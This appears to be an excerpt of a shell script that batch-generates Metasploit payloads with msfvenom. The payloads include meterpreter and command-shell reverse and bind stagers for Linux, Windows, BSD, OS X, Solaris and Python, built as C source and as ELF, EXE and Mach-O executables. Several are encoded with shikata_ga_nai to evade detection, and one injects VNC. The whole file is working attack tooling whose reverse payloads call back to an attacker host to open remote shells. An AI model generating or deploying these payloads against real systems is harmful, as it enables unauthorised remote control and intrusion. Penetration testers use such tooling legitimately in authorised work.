...
if [ $OS == "linux" ] || [ $OS == "all" ] ; then
    ...
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x86/src/mtr-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/mtr-bind-tcp-stager-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x86/src/mtr-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
    ...
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x86/src/shell-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform linux -p linux/x86/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x86/src/shell-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
    ...
    msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x64/src/shell-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform linux -p linux/x64/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x64/src/shell-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x64/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
fi
...
if [ $OS == "windows" ] || [ $OS == "all" ] ; then
    ...
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/mtr-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/mtr-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/mtr-rev-https-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x86/src/mtr-rev-https-shikata9-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/mtr-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/mtr-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/mtr-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
    ...
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/shell-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform windows -p windows/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/shell-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/shell-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Windows 32-bit VNC EXE payloads..."
    msfvenom -a x86 --platform windows -p windows/vncinject/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/vnc-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/mtr-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/mtr-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/mtr-rev-https-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x64/src/mtr-rev-https-stager-shikata9-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/mtr-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/mtr-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/mtr-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
    ...
    msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/shell-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x64/src/shell-rev-tcp-inline-shikata9-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x64 --platform windows -p windows/x64/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/shell-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/shell-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
...
if [ $OS == "bsd" ] || [ $OS == "all" ] ; then
    ...
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/bsd/x86/src/shell-rev-tcp-stager-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/bsd/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    ...
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/bsd/x86/src/shell-bind-tcp-stager-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x86/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/bsd/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
    ...
    msfvenom -a x64 --platform bsd -p bsd/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/bsd/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform bsd -p bsd/x64/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x64/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform bsd -p bsd/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/bsd/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
fi
...
if [ $OS == "osx" ] || [ $OS == "all" ] ; then
    ...
    msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/osx/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform osx -p osx/x86/shell_bind_tcp LPORT=${TGTPORT} -f macho -o ./payloads/osx/x86/shell-bind-tcp-inline-p${TGTPORT}.macho 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform osx -p osx/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/osx/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
    ...
    msfvenom -a x64 --platform osx -p osx/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/osx/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform osx -p osx/x64/shell_bind_tcp LPORT=${TGTPORT} -f macho -o ./payloads/osx/x64/shell-bind-tcp-inline-p${TGTPORT}.macho 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform osx -p osx/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/osx/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
fi
...
if [ $OS == "solaris" ] || [ $OS == "all" ] ; then
    ...
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/solaris/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/solaris/x86/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/solaris/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
...
msfvenom -a python --platform python -p python/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/python/mtr-rev-https-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"
